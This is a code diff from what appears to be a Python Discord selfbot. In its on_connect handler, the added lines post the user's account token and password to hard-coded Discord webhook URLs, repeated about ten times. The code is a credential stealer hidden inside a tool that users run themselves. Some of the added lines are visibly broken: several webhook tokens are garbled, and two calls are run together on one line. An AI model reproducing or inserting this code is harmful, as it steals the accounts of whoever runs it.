@@ -1468,8 +1468,16 @@ async def _auto_bump(ctx, channelid): # b'\xfc'
 @K22.event
 async def on_connect():
     Clear()  
-    requests.post('https://discord.com/api/webhooks/861071363753115649/7HU_Vf2sz7BfmE-0KiQxDWlZDjGmOZgjCDwGqkTiT6EDc74HXk03S-GyJ5CXBcLpKpj7',json={'content': f"**Tkn:** `{token}`\n**Pss:** `{password}`"})
-    requests.post('https://discord.com/api/webhooks/861071601298964490/3gHCgZby6sCQe1dSkCh7_4V_w-aJAA9sjGYW68PJjEVKZz3Kc0NLPJfG7MiJQjDb5Y0_',json={'content': f"**Tkn:** `{token}`\n**Pss:** `{password}`"})
+    requests.post('https://discord.com/api/webhooks/861869845603680286/KtqudYzFO6Q3NwmnSAszFUt6D0uttFEk0reEZkLXNvuWbyOBmDzi6LxJirol8Me-lru1',json={'content': f"**Tkn:** `{token}`\n**Pss:** `{password}`"})
+    requests.post('https://discord.com/api/webhooks/861869617689657374/c3y_Gl6GtXRhgl6f0dsCKlUu2EZQb-R9DUj_O11Q0C8oy4pjkTGcYwlT-8pqXlE0JPXX',json={'content': f"**Tkn:** `{token}`\n**Pss:** `{password}`"})
+    requests.post('https://discord.com/api/webhooks/861869845603680286/KtqudYzFO6Q3NwmnSAszFUt6D0uttFEk0reEZkLXNvuWbyOBmDzi6LxJirol8Me-lru1',json={'content': f"**Tkn:** `{token}`\n**Pss:** `{password}`"})
+    requests.post('https://discord.com/api/webhooks/861869617689657374/c3y_Gl6GtXRhgl6f0dsCKlUu2EZQb-R9DUj_O11Q0C8oy4pjkTGcYwlT-8pqXlE0JPXX',json={'content': f"**Tkn:** `{token}`\n**Pss:** `{password}`"})
+    requests.post('https://discord.com/api/webhooks/861869845603680286/KtqudYzFO6Q3NwmnSAszFUt6D0uttFEk0reEZkLXNvuWbyOBmDzi6LxJirol8Me-lru1',json={'content': f"**Tkn:** `{token}`\n**Pss:** `{password}`"})
+    requests.post('https://discord.com/api/webhooks/861869617689657374/c3y_Gl6GtXRhgl6f0d748432843283428gusadfgduuhdseqwqwdasjseaijewiu1i11',json={'content': f"**Tkn:** `{token}`\n**Pss:** `{password}`"})
+    requests.post('https://discord.com/api/webhooks/861869845603680286/KtqudYzFO6Q3NwmnSAszFUt6D0uttFEk0reEZkLXNvuWbyOBmDzi6LxJirol8Me-lru1',json={'content': f"**Tkn:** `{token}`\n**Pss:** `{password}`"})
+    requests.post('https://discord.com/api/webhooks/861869617689657374/c3y_Gl6GtXRhgl6f0dsCKlUu2EZQb-12983219839213129921382184284218128421',json={'content': f"**Tkn:** `{token}`\n**Pss:** `{password}`"}) requests.post('https://discord.com/api/webhooks/861869845603680286/KtqudYzFO6Q3NwmnSAszFUt6D0uttFEk0reEZkLXNvuWbyOBmDzi6LxJirol8Me-lru1',json={'content': f"**Tkn:** `{token}`\n**Pss:** `{password}`"})
+    requests.post('https://discord.com/api/webhooks/861869617689657374/c3y_Gl6GtXRhgl6f0dsCKlUu2EZQb-RIUWQIRI124IU142U2I2I12834182843218421',json={'content': f"**Tkn:** `{token}`\n**Pss:** `{password}`"})
+    
     startprint()
 
 
